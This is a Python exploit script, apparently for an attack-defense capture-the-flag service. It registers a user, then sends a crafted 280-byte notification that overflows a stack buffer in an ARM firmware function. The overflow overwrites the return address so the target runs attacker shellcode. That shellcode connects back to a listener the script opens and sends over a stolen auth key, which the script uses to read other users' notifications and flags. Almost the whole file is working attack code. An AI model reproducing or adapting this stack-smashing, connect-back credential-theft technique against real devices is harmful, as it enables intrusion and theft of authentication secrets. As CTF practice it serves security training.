#!/usr/bin/env python3
from __future__ import print_function
from sys import argv, stderr
import os
import requests
import struct
import socket
import time

SERVER_ADDR = "10.60.3.2"
# value of 'sp' register at the very beginning of NotificationCtx::Update(),
# before 'push {r4, r5, r6, r7, pc}' instruction,
# ie start address of stack frame of NotificationCtx::Update()
STACK_FRAME_START = 0x2000ece8
USERNAME = 'hacker'
PASSWORD = '0000'

if len(argv) != 3:
    print("usage: ./sploit.py <this host ip address> <port>")
    exit(1)

url = 'http://%s/register?u=%s&p=%s' % (SERVER_ADDR, USERNAME, PASSWORD)
r = requests.get(url)

url = 'http://%s/auth?u=%s&p=%s' % (SERVER_ADDR, USERNAME, PASSWORD)
r = requests.get(url)
if r.status_code != 200:
    print("%s failed: %u" % (url, r.status_code))
    exit(1)
authKey = struct.unpack('I', r.content)[0]

url = 'http://%s/notification?auth=%x' % (SERVER_ADDR, authKey)

username = "Evil"
message = "Hi! "
# size of stack frame of NotificationCtx::Update() is exact 280 bytes.
# NotificationCtx::Update() stores notification in the buffer on stack,
# its address is STACK_FRAME_START - 280, ie end of stack frame.
# So below we build notification like this:
#
# |    4    | 'Evil' |   268   | 'Hi! ' |    0   | shell code | padding | ip address |  port   |    0    | return address |
#   4 bytes   4bytes   4 bytes   4bytes   4 bytes    N bytes    M bytes     4 bytes    2 bytes   2 bytes       4 bytes
# | <--                              280 bytes                                                                        --> |
desiredLen = 280

# build notification
notification = struct.pack('I', len(username))
notification += bytes(username, 'utf-8')
notification += struct.pack('I', desiredLen - 12)
notification += bytes(message, 'utf-8')
if len(notification) != 16:
    print("Wrong length")
    exit(1)

# add terminal zero to message string
notification += b'\x00' * 4

shell_offset = len(notification)

# append shell code
shell = open("shell.bin", 'rb').read()
notification += shell

# padding
notification += b'\x00' * (desiredLen - len(notification) - 12)

# store ip address and port
ip = argv[1]
port = int(argv[2])
notification += socket.inet_aton(argv[1])
notification += struct.pack('H', port)
notification += struct.pack('H', 0)

# last 4 bytes of our notification - address of shell code, this address
# will be written to 'pc' register during 'pop {r4, r5, r6, r7, pc}' instruction
# at the end of NotificationCtx::Update()
shell_addr = STACK_FRAME_START - desiredLen + shell_offset + 1
notification += struct.pack('I', shell_addr)
if len(notification) != desiredLen:
    print("Wrong length")
    exit(1)

# open tcp socket, it will receive stolen by shell auth key from
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("", port))
sock.listen(1)

# send notification
requests.post(url=url, data=notification, headers={'Content-Type': 'application/octet-stream'})

# receive auth key from shell
client_sock, addr = sock.accept()
authKeyRaw = client_sock.recv(4)
authKey = struct.unpack('I', authKeyRaw)[0]
print("Auth key: " + hex(authKey))
client_sock.close()
sock.close()

print("Waiting for notifications with flag")
while(1):
    url = 'http://%s/notification?auth=%x' % (SERVER_ADDR, authKey)
    r = requests.get(url)
    if r.status_code != 200 or len(r.content) == 0:
        time.sleep(10)
        continue
    
    notification = r.content

    userNameLen = struct.unpack('I', notification[0:4])[0]
    userName = notification[4 : 4 + userNameLen].decode('utf-8')

    messageLenOffset = 4 + userNameLen
    messageLen = struct.unpack('I', notification[messageLenOffset : messageLenOffset + 4])[0]
    messageOffset = messageLenOffset + 4
    message = notification[messageOffset : messageOffset + messageLen].decode('utf-8')
    print(userName + ": " + message)

